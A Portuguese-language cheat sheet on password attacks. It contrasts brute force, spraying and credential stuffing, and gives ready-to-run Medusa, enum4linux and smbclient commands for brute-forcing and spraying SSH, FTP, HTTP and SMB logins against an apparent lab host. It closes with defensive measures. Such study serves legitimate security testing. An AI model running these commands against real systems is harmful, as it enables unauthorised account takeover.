💥 Ataques de Força Bruta & Medusa no Kali Linux

Visão de Cibersegurança: Ataques de autenticação visam quebrar o controle de acesso testando combinações de credenciais. A exploração pode ser Online (diretamente contra serviços de rede como SSH, SMB e FTP) ou Offline (quebrando hashes locais previamente extraídos com John the Ripper/Hashcat).

1. Modalidades de Ataques a Senhas

                    MODALIDADES DE ATAQUE A AUTENTICAÇÃO
 ┌─────────────────────────────┬─────────────────────────────┬─────────────────────────────┐
 │ Brute Force Tradicional     │ Password Spraying           │ Credential Stuffing         │
 ├─────────────────────────────┼─────────────────────────────┼─────────────────────────────┤
 │ • 1 Usuário x Muitas Senhas │ • Muitas Contas x 1 Senha   │ • Combos vazados da Web     │
 │ • Ex: 'admin' + 10.000 pws  │ • Ex: 500 contas x 'Mudar12'│ • Reaproveitamento de senhas│
 │ • Bloqueia contas (Lockout) │ • BURLA POLÍTICA DE LOCKOUT │ • Teste automatizado em APIs│
 └─────────────────────────────┴─────────────────────────────┴─────────────────────────────┘

2. Guia de Operação do Medusa

O Medusa é modular e paralelo, operando através de bibliotecas de protocolo (.mod):

# Força bruta contra SSH (Porta 22) com interrupção no primeiro sucesso (-f)
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ssh -f -v 4

# Força bruta contra FTP (Porta 21)
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp -f

# Ataque contra Autenticação Básica HTTP
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M http -m DIR:/admin -f

3. Ataque em Cadeia: Enumeração SMB ➔ Password Spraying ➔ Smbclient

O fluxo mais realista em auditorias corporativas:

# 1. Extrair usuários válidos via enum4linux:
enum4linux -U 192.168.56.102 | grep "user:" | awk -F'[' '{print $2}' | awk -F']' '{print $1}' > smb_users.txt

# 2. Executar Password Spraying testando uma única senha fraca contra todos os usuários:
medusa -h 192.168.56.102 -U smb_users.txt -p "Empresa@123" -M smbnt -f

# 3. Acessar compartilhamentos com as credenciais obtidas:
smbclient //192.168.56.102/tmp -U msfadmin

4. Contramedidas Defensivas (Blue Team)

  • Account Lockout: Bloqueio temporário (15 minutos) após 3 a 5 tentativas incorretas.
  • Autenticação Multifator (MFA): Torna inútil a senha obtida sem a chave de segundo fator (TOTP/FIDO2).
  • Fail2ban / Rate Limiting: Banimento automático no firewall de IPs com excesso de requisições de falha.
